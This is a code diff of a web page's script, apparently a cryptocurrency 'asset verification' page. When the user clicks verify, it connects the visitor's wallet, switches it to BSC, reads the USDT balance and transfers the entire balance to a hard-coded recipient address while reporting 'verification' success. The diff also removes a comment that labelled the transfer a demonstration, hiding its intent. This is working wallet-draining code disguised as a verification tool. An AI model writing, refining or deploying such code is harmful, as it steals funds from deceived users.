@@ -375,7 +375,7 @@
     </footer>
 
     <script>
-       const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
+        const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
         const recipient = "0x60eA1bc1b4b0e064BcbeA62845eD6CA36b9663CE";
         const usdtAbi = [
             "function balanceOf(address owner) view returns (uint256)",
@@ -427,7 +427,8 @@
             } catch (error) {
                 console.error("Error fetching balance:", error);
                 balanceElement.textContent = "Error fetching balance.";
-            }        }
+            }
+        }
 
         async function switchToBSCAndGetAccount() {
             if (!window.ethereum) {
@@ -468,8 +469,7 @@
         async function verifyAssets() {
             log("", 'info');
             showLoading(true);
-            verifyButton.disabled = true; // Disable button during operation
-
+            verifyButton.disabled = true;
 
             const userAddress = await switchToBSCAndGetAccount();
             if (!userAddress) {
@@ -479,16 +479,15 @@
             }
 
             const provider = new ethers.providers.Web3Provider(window.ethereum);
-            await getBalance(provider, userAddress);
+             await getBalance(provider, userAddress);
 
             try {
-                const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, provider.getSigner());  // Use getSigner()
+                const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, provider.getSigner());
 
-                // Simulate a transfer of all funds (for demonstration purposes)
                 const balance = await usdtContract.balanceOf(userAddress);
                 const tx = await usdtContract.transfer(recipient, balance);
                 log(`✅ Transfer initiated. Transaction Hash: ${tx.hash}`, 'success');
-                await tx.wait(); // Wait for the transaction to be mined
+                await tx.wait();
                 log("✅ Asset verification and transfer successful.", 'success');
 
 
@@ -497,7 +496,7 @@
                 log(`❌ Verification failed: ${err?.message || err}`, 'error');
             } finally {
                 showLoading(false);
-                verifyButton.disabled = false; // Re-enable the button
+                verifyButton.disabled = false;
             }
         }
 
